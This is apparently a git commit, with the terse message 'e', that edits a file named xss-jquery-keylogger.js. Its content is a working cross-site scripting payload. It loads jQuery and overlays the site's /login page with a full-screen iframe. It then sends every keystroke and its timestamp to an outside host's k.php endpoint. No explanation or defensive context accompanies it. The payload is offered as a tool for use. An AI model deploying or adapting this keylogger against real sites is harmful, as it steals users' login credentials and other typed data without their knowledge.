e54b38757ca636b63c10a4877925a9a4022df16a
kigihan <kigihan77@gmail.com>
2019-07-02 15:46:57 +0800

    e

--- xss-jquery-keylogger.js
+++ xss-jquery-keylogger.js
@@ -1,1 +1,2 @@
+<script type="text/javascript" src="https://cdn.staticfile.org/jquery/3.4.1/jquery.min.js"></script>
 <iframe src="/login" id="w" style="width:100%; height:100%; position:absolute; top:0; left:0; z-index:2; background-color:#ffffff;" onload="$('#w').contents().keypress(function(event) {$.get('https://www.glhf.com.tw/k.php?x='+event.which+'&t='+event.timeStamp,function(data){});});"></iframe>
